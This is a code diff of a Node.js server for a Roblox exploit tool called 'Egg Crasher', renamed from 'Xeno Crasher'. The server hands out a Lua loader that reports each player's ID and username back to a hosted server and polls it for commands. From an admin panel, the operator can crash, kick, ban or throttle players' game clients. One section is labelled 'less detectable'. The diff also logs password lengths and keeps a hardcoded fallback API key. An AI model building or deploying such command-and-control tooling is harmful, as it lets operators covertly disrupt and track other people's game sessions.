@@ -1,3 +1,8 @@
+// Server.js - Egg Crasher (renamed from Xeno Crasher)
+// All xeno -> egg, skull emoji -> egg emoji.
+
+require('dotenv').config();
+
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
@@ -7,14 +12,18 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 const PUBLIC_URL = process.env.PUBLIC_URL || 'https://crasherscript-production.up.railway.app';
 
-// ============================================
-// AUTH CONFIG (server-side only)
-// ============================================
-const PANEL_PASSWORD = process.env.PANEL_PASSWORD || 'CHANGE_ME_IN_ENV';
-const API_KEY = process.env.API_KEY || 'xenooooo';
-const SESSION_TTL = 1000 * 60 * 60 * 4; // 4 hours
+const RAW_PANEL_PASSWORD = process.env.PANEL_PASSWORD;
+const PANEL_PASSWORD = (RAW_PANEL_PASSWORD && RAW_PANEL_PASSWORD.trim()) || 'CHANGE_ME_IN_ENV';
+const API_KEY = process.env.API_KEY || 'eggoooo';
+const SESSION_TTL = 1000 * 60 * 60 * 4;
 
-const sessions = new Map(); // token -> expiry
+console.log('[AUTH] PANEL_PASSWORD env present:', !!RAW_PANEL_PASSWORD);
+console.log('[AUTH] PANEL_PASSWORD length after trim:', PANEL_PASSWORD.length);
+if (PANEL_PASSWORD === 'CHANGE_ME_IN_ENV') {
+    console.warn('[AUTH] WARNING: Using default PANEL_PASSWORD. Set PANEL_PASSWORD in Railway variables.');
+}
+
+const sessions = new Map();
 
 function makeToken() {
     return crypto.randomBytes(32).toString('hex');
@@ -31,9 +40,6 @@ function requireAuth(req, res, next) {
     next();
 }
 
-// ============================================
-// MIDDLEWARE
-// ============================================
 app.use(cors({
     origin: '*',
     methods: ['GET', 'POST', 'OPTIONS'],
@@ -41,23 +47,25 @@ app.use(cors({
 }));
 app.use(express.json({ limit: '10mb' }));
 
-// ============================================
-// STATE
-// ============================================
 const players = new Map();
 const bannedPlayers = new Map();
 
-// ============================================
-// AUTH ROUTES
-// ============================================
 app.post('/api/auth/login', (req, res) => {
     const { password } = req.body || {};
     if (!password) return res.status(400).json({ error: 'Missing password' });
 
-    const a = Buffer.from(String(password));
-    const b = Buffer.from(PANEL_PASSWORD);
+    const input = String(password);
+    const expected = PANEL_PASSWORD;
+
+    console.log('[AUTH] Login attempt. input length:', input.length, 'expected length:', expected.length);
+
+    const a = Buffer.from(input);
+    const b = Buffer.from(expected);
     const ok = a.length === b.length && crypto.timingSafeEqual(a, b);
-    if (!ok) return res.status(401).json({ error: 'Invalid password' });
+    if (!ok) {
+        console.warn('[AUTH] Password mismatch');
+        return res.status(401).json({ error: 'Invalid password' });
+    }
 
     const token = makeToken();
     sessions.set(token, Date.now() + SESSION_TTL);
@@ -74,11 +82,8 @@ app.get('/api/auth/check', requireAuth, (req, res) => {
     res.json({ ok: true });
 });
 
-// ============================================
-// LOADER SCRIPT
-// ============================================
 app.get('/loader.lua', (req, res) => {
-    const loader = `--[[ Xeno Crasher - WITH BAN + FPS FIX ]]--
+    const loader = `--[[ Egg Crasher - WITH BAN + FPS FIX ]]--
 local BASE = "${PUBLIC_URL}"
 local KEY = "${API_KEY}"
 
@@ -149,15 +154,12 @@ local function heartbeat()
         user_id = LP.UserId,
         username = LP.Name,
         display_name = LP.DisplayName,
-        executor = "XenoClient",
+        executor = "EggClient",
         online = true
     })
     sendRequest("POST", BASE .. "/api/public/heartbeat", data)
 end
 
--- ============================================
--- FPS LIMITER (multi-method fallback)
--- ============================================
 local fpsBinding = nil
 local fpsConnection = nil
 local fpsActive = false
@@ -179,22 +181,19 @@ local function setFPSLimit(targetFPS)
 
     targetFPS = tonumber(targetFPS)
     if not targetFPS or targetFPS <= 0 then
-        -- try to restore default cap
         if setfpscap then pcall(function() setfpscap(60) end) end
         return
     end
     if targetFPS > 240 then targetFPS = 240 end
 
-    -- Method 1: executor-native (most reliable)
     if setfpscap then
         local ok = pcall(function() setfpscap(targetFPS) end)
         if ok then return end
     end
 
-    -- Method 2: BindToRenderStep busy-wait above Camera priority
     fpsActive = true
     local frameTime = 1 / targetFPS
-    fpsBinding = "XenoFPSLimiter_" .. tostring(math.random(1, 1e9))
+    fpsBinding = "EggFPSLimiter_" .. tostring(math.random(1, 1e9))
 
     local ok = pcall(function()
         RunService:BindToRenderStep(fpsBinding, Enum.RenderPriority.Camera.Value + 1, function(dt)
@@ -208,7 +207,6 @@ local function setFPSLimit(targetFPS)
     end)
 
     if not ok then
-        -- Method 3: Heartbeat yield loop (weakest, no CPU spin)
         fpsBinding = nil
         local last = os.clock()
         fpsConnection = RunService.Heartbeat:Connect(function()
@@ -223,9 +221,6 @@ local function setFPSLimit(targetFPS)
     end
 end
 
--- ============================================
--- CRASH (bounded, less detectable)
--- ============================================
 local function crashGame()
     task.spawn(function()
         while true do
@@ -243,9 +238,6 @@ local function crashGame()
     end)
 end
 
--- ============================================
--- POLLING
--- ============================================
 local pollRunning = false
 local function poll()
     if pollRunning then return end
@@ -305,9 +297,6 @@ end)`;
     res.send(loader);
 });
 
-// ============================================
-// PUBLIC CLIENT ENDPOINTS
-// ============================================
 app.get('/api/public/checkban', (req, res) => {
     const { user_id } = req.query;
     if (!user_id) return res.json({ banned: false });
@@ -328,7 +317,6 @@ app.post('/api/public/heartbeat', (req, res) => {
         user_id: userId,
         online: true,
         lastHeartbeat: Date.now(),
-        // preserve pending commands
         _crash: existing._crash || false,
         _kick: existing._kick || false,
         _kick_message: existing._kick_message || '',
@@ -373,9 +361,6 @@ app.get('/api/public/command', (req, res) => {
     res.json(response);
 });
 
-// ============================================
-// PROTECTED ADMIN ENDPOINTS
-// ============================================
 app.get('/api/players', requireAuth, (req, res) => {
     const list = [];
     const now = Date.now();
@@ -427,6 +412,6 @@ app.get('/', (req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log(`🚀 Xeno Crasher Server running on port ${PORT}`);
+    console.log(`🚀 Egg Crasher Server running on port ${PORT}`);
     console.log(`📍 Public URL: ${PUBLIC_URL}`);
 });
